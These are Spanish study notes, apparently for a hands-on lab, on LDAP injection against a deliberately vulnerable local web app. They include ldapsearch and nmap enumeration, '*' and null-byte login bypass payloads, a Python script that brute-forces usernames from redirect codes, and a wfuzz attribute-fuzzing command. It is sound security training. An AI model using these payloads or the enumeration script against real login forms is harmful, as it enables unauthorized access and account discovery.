------

Las inyecciones **LDAP** (**Protocolo de Directorio Ligero**) son un tipo de ataque en el que se aprovechan las vulnerabilidades en las aplicaciones web que interactúan con un servidor LDAP. El servidor LDAP es un directorio que se utiliza para almacenar información de usuarios y recursos en una red.

La inyección LDAP funciona mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servidor LDAP para su procesamiento. Si la aplicación web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP.

Al igual que las inyecciones SQL y NoSQL, las inyecciones LDAP pueden ser muy peligrosas. Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen:

- Acceder a información de usuarios o recursos que no debería tener acceso.
- Realizar cambios no autorizados en la base de datos del servidor LDAP, como agregar o eliminar usuarios o recursos.
- Realizar operaciones maliciosas en la red, como lanzar ataques de phishing o instalar software malicioso en los sistemas de la red.

Para evitar las inyecciones LDAP, las aplicaciones web que interactúan con un servidor LDAP deben validar y limpiar adecuadamente la entrada del usuario antes de enviarla al servidor LDAP. Esto incluye la validación de la sintaxis de los campos de entrada, la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en el servidor LDAP.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades del servidor LDAP para detectar posibles inyecciones.

A continuación, se proporciona el enlace directo al proyecto de Github que nos descargamos para desplegar un laboratorio práctico donde poder ejecutar esta vulnerabilidad:

- **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)

## Notas de la practica

![[Pasted image 20260227111747.png]]

Esa es la web donde vamos a practicar.

Bueno vamos a usar una herramienta de `ldap` para eso, lo que vamos a hacer en este caso es lo siguiente:

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```

![[Pasted image 20260227112145.png]]

donde lo que hacemos es:
- Definir la base de búsqueda, lo que hacemos es fragmentar el dominio el cual es `example.org` y lo definimos como `dc=example,dc=org`.
	- Bueno para saber este dominio es necesario una enumeración y en este caso podemos hacer uso de algunos scripts de `nmap` -> `nmap --script ldap\* -p389 localhost`.

![[Pasted image 20260227112553.png]]
- Luego tenemos lo que se conoce como `Distinguiset name` donde definimos `-D "cn=admin",dc=example,dc=org` pasamos un usuario perteneciente a LDAP y es la forma de indicarle como que usuario queremos entrar.
- Con `-w admin` le indicamos la contraseña en este caso es `admin`.
- Con `-x` es para indicarle que queremos una autenticación simple mediante un usuario y una contraseña.
- Lo ultimo `'cn=admin'` es nuestro criterio de búsqueda, un filtro que usamos para hacer la búsqueda.

Listo ahora nosotros este criterio de búsqueda o filtro lo podemos hacer mas complejo, que en realidad es lo que hace la web por detrás pero como ejemplo nosotros podemos concatenar `and` u `or` para realizar búsqueda extra como por ejemplo:

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=LDAP administrator))'
```

![[Pasted image 20260227113442.png]]

si fallamos en describir algo vamos a observar como la búsqueda también falla:

![[Pasted image 20260227113529.png]]

Tomando en cuenta que nosotros jugamos con filtros y el como se esta implementando la sintaxis de dichos filtros, la estructura para facilidad también la podemos ver como:
![[Pasted image 20260227114454.png]]

donde y si nosotros en lugar de pasarle una password directamente le pasamos un `*` que engloba todas las posibilidades?, vemos que sucede:

![[Pasted image 20260227114609.png]]

![[Pasted image 20260227114618.png]]

Ingresamos como el usuario `admin`.

Vamos al Burp Suite y vamos a ver un poco mas extremo el como podemos hacer las inyecciónes:

![[Pasted image 20260227115028.png]]

Podemos observar como ya tenemos la petición y en realidad no vemos una respuesta correcta, en el caso exclusivo de la web porque esto no aplica para todas cuando algo es valido podemos ver un `open redirect` con código de estado `301`. Podemos verificarlo haciendo la inyección de un comienzo:

![[Pasted image 20260227115227.png]]

Como podemos observar tenemos el `redirect`.

En realidad nosotros podemos mediante el `*` ir armando de apoco usuarios y contraseñas, por ejemplo con `a*` le decimos en el usuario que inicie con `a` y luego lo que sea: 

![[Pasted image 20260227115325.png]]

Podemos observar como es valido. Ahora esta es una vía potencial para ir armando en realidad lo que es el usuario y hasta la contraseña.

![[Pasted image 20260227115553.png]]

En esto tenemos múltiples, posibilidades y bueno ya es algo mas de fuerza bruta para descubrir todas las posibles. 

Ahora mediante diferentes inyecciones e intentando reconocer la estructura de la web podemos intentar cerrar una consulta e nel usuario y mediante un null byte podemos hacer que no se interprete el resto de la petición en este caso la contraseña, es como comentarlo para que no se interprete:

![[Pasted image 20260227120335.png]]

Como podemos observar que es valido.

Bueno vamos a comenzar con la enumeración de usuarios suponiendo que no sabemos la contraseña pero es valido el uso de `*` quedaría:

![[Pasted image 20260227121415.png]]

Con ese concepto vamos a crear un script en Python que nos permite hacer fuerza bruta y descubrir usuarios:

```python
#!/usr/bin/python3

import requests, time, sys, signal, string

from pwn import *

headers = {'Content-Type': 'application/x-www-form-urlencoded'}
main_url="http://localhost:8888"

def def_handler(sig, frame):
    print(f"\n\n[!] Saliendo ......\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def getInitialUsers():

    characters =string.ascii_lowercase

    initial_users = []


    for character in characters:
        post_data="user_id={}*&password=*&login=1&submit=Submit".format(character)

        r = requests.post(main_url, data=post_data, headers=headers,
                          allow_redirects=False)

        if r.status_code == 301:
            initial_users.append(character)

    return initial_users

def getUsers(users):
    
    characters = string.ascii_lowercase
    valid_users = []

    for first_character in users:
        user = ""
        user =first_character
        for position in range(0,15):
            for character in characters:
                post_data="user_id={}{}*&password=*&login=1&submit=Submit".format(user,character)

                r = requests.post(main_url, data=post_data, headers=headers,
                          allow_redirects=False)

                if r.status_code ==301:
                    user +=character
                    break

        valid_users.append(user)

    return valid_users



if __name__ == '__main__':
    initial_users = getInitialUsers()
    print(initial_users)
    valid_users = getUsers(initial_users)
    print(valid_users)
```

![[Pasted image 20260227135242.png]]

Podríamos adornar mucho mas la salida y extenderla con diferentes apartados pero eso ya queda a preferencia de cada uno.

Se podria implementar como ya conocemos de la siguiente manera para obtener información como la descripción:
![[Pasted image 20260227135452.png]]

Vamos ahora a hacer fuzzing intentando encontrar atributos validos en el sistema recordando que nos acepta el `*`  vamos a crea una estructura de la siguiente manera:

![[Pasted image 20260227121706.png]]

En este cazo queda solo englobado lo seleccionado y nos permite buscar por diferentes atributos, ahora nosotros ya tenemos que tener el caso valido, quiero decir, en caso de ser valido tiene cierto código de estado, tiene cierta longitud, tiene algo que lo diferencia de cuando es erróneo.

En nuestro caso jugamos con el código de estado y vemos que sucede:
```bash
wfuzz --hc=200 -c -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit' -u http://172.17.0.1:8888/
```

![[Pasted image 20260227125921.png]]

Podemos ver como ya filtramos por varios atributos, que son muchos.